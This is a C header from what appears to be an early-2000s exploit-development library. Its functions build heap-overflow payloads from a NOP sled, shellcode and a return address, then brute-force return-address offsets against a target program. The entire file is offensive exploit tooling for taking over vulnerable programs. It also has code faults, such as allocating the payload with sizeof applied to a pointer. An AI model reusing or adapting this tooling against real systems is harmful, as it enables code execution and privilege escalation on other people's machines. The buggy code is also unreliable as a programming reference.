/*
 *  IOCExpLib.h - by IOC - www.ioc.fr.st
 *  Version: IOCExpLib v1.0a Beta - 06/03
 *  File name: IOCEL_fs.h 
 *  Description: includes heap-based overflow functions
 *  Contact me - Li0n7@voila.fr
 *
 */




#ifndef __IOCEL_HB_H
#define __IOCEL_HB_H



    
#include "IOCExpLib.h"






#define VERBOSE








int
IOCExpLib_hb_build(int bsize, int offset, unsigned long addr, char *shellcode, int jmp)
{

      char *buffer;
      char *ptr;
      unsigned long *addr_ptr, ret;

      if(bsize == 0)
      {
          fprintf(stderr, "[+] Buffer size must no be null\n");
          return -1;
      }


      if(jmp != 0)
          buffer = (char *)malloc(bsize+20+4+1);
      else
          buffer = (char *)malloc(bsize+4);

      ptr = buffer;

      ret = addr + offset;
      fprintf(stdout, "[+] Using ret address: 0x%x\n", ret);

      if(jmp != 0){
          ptr = IOCExpLib_put_nop(ptr, (bsize + 20 - 4) - strlen(shellcode));
          ptr += (bsize + 20 - 4) - strlen(shellcode);
      } else {
          ptr = IOCExpLib_put_nop(ptr, bsize - strlen(shellcode));
          ptr += bsize-strlen(shellcode);
      }

      ptr = IOCExpLib_put_shellcode(ptr, shellcode);

      addr_ptr = (long *)ptr;
      if (jmp != 0) *(addr_ptr++) = 0xbfffaaaa;
      *(addr_ptr++) = ret;
      ptr = (char *)addr_ptr;
      *ptr = 0;

      IOCExpLib_payload = (char *)malloc(sizeof(buffer)+1);
      strncpy(IOCExpLib_payload, buffer, strlen(buffer)+1);

      return 0;
}















int
IOCExpLib_hb_bruteforce(int bsize, int offset, long addr, char cmd[256], char *shellcode, int jmp)
{
      int i, ret = 1;

      if (cmd == NULL)
      {
          fprintf(stderr, "[-] You must enter a valid prog-path to exploit\n");
          return -1;
      }


      for (i = offset; i >= 0; i = i - 10)
      {
          #ifdef VERBOSE
              fprintf(stdout, "[+] Using offset: %i\n", i);
          #endif

          IOCExpLib_hb_build(bsize, i, addr, shellcode, jmp);
          IOCExpLib_split(cmd);
          ret = IOCExpLib_tease();

          if (ret == 0){
              IOCExpLib_offset = i;
              IOCExpLib_addr = addr + IOCExpLib_offset;
              break;
          }

      }

      if (ret == 0)
          fprintf(stdout, "[+] Offset found: %i, a working return address could be: 0x%x\n", IOCExpLib_offset, (addr+IOCExpLib_offset));
      else
          fprintf(stdout, "[-] No offset found\n");

      return 0;
}

#endif



